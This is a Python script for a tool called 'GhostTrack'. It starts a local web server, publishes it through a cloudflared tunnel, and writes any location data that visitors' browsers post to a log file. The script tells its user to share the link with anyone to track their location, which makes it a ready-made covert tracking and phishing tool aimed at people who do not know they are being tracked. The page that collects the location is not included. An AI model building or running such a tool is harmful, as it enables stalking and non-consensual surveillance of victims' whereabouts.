#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║           G H O S T T R A C K  v1.0                                                            ║
║        Advanced Location Intelligence Tool                                                     ║
║              by: ALONE BEAST.                                                                  ║
╚══════════════════════════════════════════════════════════╝
"""

import subprocess
import threading
import time
import sys
import os
import re
import signal
import http.server
import socketserver
import webbrowser
from pathlib import Path
from datetime import datetime


class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    BLINK   = "\033[5m"

    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"

    BG_BLACK  = "\033[40m"
    BG_GREEN  = "\033[42m"
    BG_RED    = "\033[41m"

    G  = GREEN + BOLD
    Y  = YELLOW + BOLD
    R  = RED + BOLD
    CY = CYAN + BOLD
    M  = MAGENTA + BOLD
    W  = WHITE + BOLD


PORT = 8000
HOST = "127.0.0.1"


http_process = None
cloudflare_process = None
public_url = None
location_file = "captured_locations.txt"


def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def typer(text, delay=0.018):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()
  
def tag(label, color=C.G):
    return f"{color}[{label}]{C.RESET}"

def info(msg):   print(f"  {tag('*', C.G)}  {C.W}{msg}{C.RESET}")
def warn(msg):   print(f"  {tag('!', C.Y)}  {C.Y}{msg}{C.RESET}")
def error(msg):  print(f"  {tag('✗', C.R)}  {C.R}{msg}{C.RESET}")
def success(msg):print(f"  {tag('✔', C.G)}  {C.G}{msg}{C.RESET}")
def step(n, msg):print(f"  {tag(str(n), C.CY)}  {C.CY}{msg}{C.RESET}")

def separator(char="─", color=C.G):
    print(f"{color}  {'─'*54}{C.RESET}")

def pulse(msg, duration=1.2, color=C.G):
    frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(f"\r  {color}{frames[i % len(frames)]}{C.RESET}  {msg}   ")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write(f"\r  {C.G}✔{C.RESET}  {msg}   \n")
    sys.stdout.flush()


def banner():
    clr()
    art = f"""
{C.G}  ╔══════════════════════════════════════════════════════╗
  ║                                                      ║
  ║   {C.CY} ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗      {C.G}║
  ║   {C.CY}██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝      {C.G}║
  ║   {C.CY}██║  ███╗███████║██║   ██║███████╗   ██║         {C.G}║
  ║   {C.CY}██║   ██║██╔══██║██║   ██║╚════██║   ██║         {C.G}║
  ║   {C.CY}╚██████╔╝██║  ██║╚██████╔╝███████║   ██║         {C.G}║
  ║   {C.CY} ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝         {C.G}║
  ║                                                      ║
  ║   {C.M}████████╗██████╗  █████╗  ██████╗██╗  ██╗         {C.G}║
  ║   {C.M}╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝         {C.G}║
  ║   {C.M}   ██║   ██████╔╝███████║██║     █████╔╝          {C.G}║
  ║   {C.M}   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗          {C.G}║
  ║   {C.M}   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗         {C.G}║
  ║   {C.M}   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝         {C.G}║
  ║                                                      ║
  ║   {C.DIM}{C.WHITE}  Advanced Location Intelligence System v1.0    {C.G}   ║
  ║   {C.DIM}{C.WHITE}  Tunnel • Track • Share • Expose               {C.G}   ║
  ╚══════════════════════════════════════════════════════╝{C.RESET}
"""
    print(art)
    time.sleep(0.4)


def boot_sequence():
    separator()
    lines = [
        "Initializing GhostTrack Engine...",
        "Loading location modules...",
        "Mounting web interface...",
        "Establishing tunnel bridge...",
        "Encrypting payload channel...",
    ]
    for line in lines:
        pulse(line, duration=0.6, color=C.G)
    separator()
    print()


class LocationLoggerHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  
    
    def do_POST(self):
        if self.path == '/log_location':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Save to file
            with open(location_file, 'a') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"[{timestamp}]\n")
                f.write(f"{post_data}\n")
                f.write(f"Live URL: {public_url}\n")
                f.write(f"{'='*60}\n")
            
            # Print to terminal
            print(f"\n{C.G}{'='*56}{C.RESET}")
            print(f"{C.CY}[LOCATION CAPTURED] {timestamp}{C.RESET}")
            print(f"{C.W}{post_data}{C.RESET}")
            print(f"{C.G}{'='*56}{C.RESET}\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            super().do_GET()

def start_http_server():
    global http_process
    script_dir = Path(__file__).parent
    os.chdir(script_dir)

    class ReusableTCPServer(socketserver.TCPServer):
        allow_reuse_address = True

    def run():
        with ReusableTCPServer((HOST, PORT), LocationLoggerHandler) as httpd:
            httpd.serve_forever()

    t = threading.Thread(target=run, daemon=True)
    t.start()
    time.sleep(0.8)
    success(f"HTTP Server  →  http://{HOST}:{PORT}")


def start_cloudflared():
    global cloudflare_process, public_url

    step(1, "Launching cloudflared tunnel...")

    try:
        cloudflare_process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://{HOST}:{PORT}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
    except FileNotFoundError:
        error("cloudflared not found! Install it:")
        warn("  → https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/")
        warn("  → Or: brew install cloudflare/cloudflare/cloudflared")
        sys.exit(1)

    print()
    step(2, "Waiting for tunnel URL...")

    url_pattern = re.compile(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com')
    timeout = time.time() + 30

    while time.time() < timeout:
        line = cloudflare_process.stdout.readline()
        if not line:
            break
        match = url_pattern.search(line)
        if match:
            public_url = match.group(0)
            break

    if not public_url:
        error("Failed to get tunnel URL. Check cloudflared installation.")
        sys.exit(1)

    print()
    separator("═", C.G)
    print(f"\n  {C.G}╔══════════════════════════════════════════════════╗{C.RESET}")
    print(f"  {C.G}║  {C.Y}🌐  PUBLIC URL GENERATED SUCCESSFULLY            {C.G}║{C.RESET}")
    print(f"  {C.G}╠══════════════════════════════════════════════════╣{C.RESET}")
    print(f"  {C.G}║                                                  ║{C.RESET}")
    url_display = public_url[:48] if len(public_url) > 48 else public_url.ljust(48)
    print(f"  {C.G}║  {C.CY}{url_display}{C.G}  ║{C.RESET}")
    print(f"  {C.G}║                                                  ║{C.RESET}")
    print(f"  {C.G}╚══════════════════════════════════════════════════╝{C.RESET}\n")
    separator("═", C.G)
    print()
    success("Share this URL with ANYONE to track their location!")
    warn("They just need to open the link in their browser.")
    print()


def live_monitor():
    print(f"\n  {C.DIM}{C.WHITE}{'─'*54}{C.RESET}")
    info(f"GhostTrack is {C.G}LIVE{C.RESET} and listening...")
    info(f"Local  →  {C.CY}http://{HOST}:{PORT}{C.RESET}")
    info(f"Public →  {C.CY}{public_url}{C.RESET}")
    info(f"Logs   →  {C.Y}{location_file}{C.RESET}")
    print(f"  {C.DIM}{C.WHITE}{'─'*54}{C.RESET}\n")
    warn("Press  Ctrl+C  to stop the server\n")

    try:
        while True:
            now = time.strftime("%H:%M:%S")
            sys.stdout.write(
                f"\r  {C.G}[{now}]{C.RESET}  {C.DIM}Tunnel active — waiting for connections...{C.RESET}   "
            )
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        shutdown()


def shutdown():
    print(f"\n\n  {C.Y}[!]{C.RESET}  Shutting down GhostTrack...\n")
    if cloudflare_process:
        cloudflare_process.terminate()
    pulse("Closing tunnel...", 0.8, C.R)
    pulse("Stopping server...", 0.6, C.R)
    print(f"\n  {C.G}[✔]{C.RESET}  GhostTrack terminated. Stay ghost. 👻\n")
    sys.exit(0)


def main():
    signal.signal(signal.SIGINT, lambda s, f: shutdown())

    banner()
    boot_sequence()
    start_http_server()
    start_cloudflared()
    live_monitor()

if __name__ == "__main__":
    main()
